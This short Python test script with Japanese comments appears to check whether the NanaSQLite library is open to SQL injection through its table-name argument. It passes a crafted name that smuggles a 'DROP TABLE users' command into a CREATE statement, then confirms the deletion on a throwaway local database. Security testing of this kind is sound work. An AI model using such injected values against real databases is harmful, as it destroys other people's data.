import os
import sqlite3
from nanasqlite import NanaSQLite

db_path = "test_sqli.db"
if os.path.exists(db_path):
    os.remove(db_path)

# 準備: usersテーブルを作成しておく
conn = sqlite3.connect(db_path)
conn.execute("CREATE TABLE users (id INTEGER, name TEXT)")
conn.execute("INSERT INTO users VALUES (1, 'Alice')")
conn.commit()

print("Before injection:")
print(conn.execute("SELECT * FROM users").fetchall())

try:
    # 脆弱性: table名にSQLインジェクション
    # "CREATE TABLE IF NOT EXISTS {self._table} (key TEXT...)"
    malicious_table_name = "data (key TEXT PRIMARY KEY, value TEXT); DROP TABLE users; --"
    db = NanaSQLite(db_path, table=malicious_table_name)
    db.close()
    print("NanaSQLite initialized with malicious table name.")
except Exception as e:
    print(f"Error during init (this is safe): {e}")
    db.close()

try:
    print("After injection (checking if users table exists):")
    # これがエラー(no such table)になればインジェクション成功 = usersテーブルが消去された
    print(conn.execute("SELECT * FROM users").fetchall())
except sqlite3.OperationalError as e:
    print(f"SQL Injection SUCCESSFUL! Error: {e}")

conn.close()
if os.path.exists(db_path):
    os.remove(db_path)
